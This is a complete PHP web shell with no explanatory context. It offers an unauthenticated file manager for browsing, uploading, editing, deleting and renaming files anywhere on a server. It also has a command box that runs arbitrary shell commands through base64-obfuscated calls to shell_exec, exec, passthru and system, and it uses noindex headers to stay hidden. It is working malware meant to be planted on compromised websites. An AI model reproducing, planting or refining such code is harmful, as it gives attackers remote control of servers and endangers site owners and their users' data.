<?php
header("X-Robots-Tag: noindex, nofollow");
session_start();

function safePath($path) {
    $resolved = realpath($path);
    return ($resolved && is_dir($resolved)) ? $resolved : getcwd();
}

$root = isset($_GET['p']) ? safePath($_GET['p']) : getcwd();

function showList($dir) {
    $items = @scandir($dir);
    if (!is_array($items)) return;
    echo "<ul>";
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = realpath($dir . DIRECTORY_SEPARATOR . $item);
        if (!$fullPath) continue;
        $escaped = htmlspecialchars($item);
        $query = "?p=" . urlencode($dir);
        if (is_dir($fullPath)) {
            echo "<li><a href='?p=" . urlencode($fullPath) . "'>[DIR] $escaped</a></li>";
        } else {
            echo "<li>$escaped 
                [<a href='$query&mode=edit&id=" . urlencode($item) . "'>Edit</a>] 
                [<a href='$query&mode=delete&id=" . urlencode($item) . "' onclick='return confirm(\"Are you sure?\");'>Delete</a>] 
                [<a href='$query&mode=rename&id=" . urlencode($item) . "'>Rename</a>]
            </li>";
        }
    }
    echo "</ul>";
}

function uploadFile($dir) {
    if (isset($_FILES['file']) && $_FILES['file']['error'] === 0) {
        $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (@move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<p style='color:green;'>Upload successful.</p>";
        }
    }
}

function createDirectory($dir) {
    $name = trim($_POST['folder'] ?? '');
    if ($name !== '') {
        $path = $dir . DIRECTORY_SEPARATOR . basename($name);
        if (!is_dir($path)) @mkdir($path);
    }
}

function createFile($dir) {
    $name = trim($_POST['file'] ?? '');
    if ($name !== '') {
        $path = $dir . DIRECTORY_SEPARATOR . basename($name);
        if (!file_exists($path)) @file_put_contents($path, '');
    }
}

function editFile($file) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        file_put_contents($file, $_POST['content'] ?? '');
        echo "<p>File saved.</p>";
    }
    $text = @file_get_contents($file);
    $safeText = htmlspecialchars($text);
    echo "<form method='POST'>
        <textarea name='content' style='width:100%;height:250px;'>$safeText</textarea><br>
        <input type='submit' value='Save File'>
    </form>";
}

function deleteFile($file) {
    if (file_exists($file)) @unlink($file);
}

function renameFile($file, $dir) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $newName = $dir . DIRECTORY_SEPARATOR . basename($_POST['newname'] ?? '');
        if ($newName !== $file) @rename($file, $newName);
    } else {
        echo "<form method='POST'>
            <input type='text' name='newname' placeholder='New name' required>
            <input type='submit' value='Rename'>
        </form>";
    }
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) uploadFile($root);
    if (isset($_POST['folder'])) createDirectory($root);
    if (isset($_POST['file'])) createFile($root);
}

if (isset($_GET['mode']) && isset($_GET['id'])) {
    $id = basename($_GET['id']);
    $path = realpath($root . DIRECTORY_SEPARATOR . $id);
    if ($path && strpos($path, $root) === 0 && is_file($path)) {
        switch ($_GET['mode']) {
            case 'edit': editFile($path); exit;
            case 'delete': deleteFile($path); break;
            case 'rename': renameFile($path, $root); exit;
        }
    }
}

$command = '';
$output = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['cmd'])) {
    $command = $_POST['cmd'];
    $funcs = [
        base64_decode('c2hlbGxfZXhlYw=='),  
        base64_decode('ZXhlYw=='),         
        base64_decode('cGFzc3RocnU='),     
        base64_decode('c3lzdGVt')          
    ];
    foreach ($funcs as $f) {
        if (is_callable($f)) {
            ob_start();
            $f($command);
            $output = ob_get_clean();
            if ($output) break;
        }
    }
}
echo "<meta name='robots' content='noindex,nofollow'>";
echo "<style>
    body { font-family: monospace; background: #f5f5f5; padding: 15px; color: #000; }
    a { text-decoration: none; color: #0066cc; }
    ul { list-style: none; padding-left: 0; }
    li { margin: 6px 0; }
    input[type=text], input[type=file], textarea { width: 100%; margin-top: 5px; }
    .output { margin-top: 15px; background: #000; color: #0f0; padding: 10px; white-space: pre-wrap; }
</style>";

echo "<a href='?p=" . urlencode(dirname($root)) . "'>Go Back</a>";
echo "<p><strong>Current Path:</strong> $root</p>";
showList($root);

echo <<<HTML
<hr>
<h3>UpFile</h3>
<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <input type="submit" value="Upload">
</form>

<h3>Create Folder</h3>
<form method="POST">
    <input type="text" name="folder" placeholder="Folder name" required>
    <input type="submit" value="Create">
</form>

<h3>Create File</h3>
<form method="POST">
    <input type="text" name="file" placeholder="File name" required>
    <input type="submit" value="Create">
</form>

<hr>
<h3>CMD</h3>
<form method="POST">
    <input type="text" name="cmd" placeholder="Enter c0mand" value="".htmlspecialchars($command)."">
    <input type="submit" value="Run">
</form>
HTML;

if ($output) {
    echo "<div class='output'>" . htmlspecialchars($output) . "</div>";
}
?>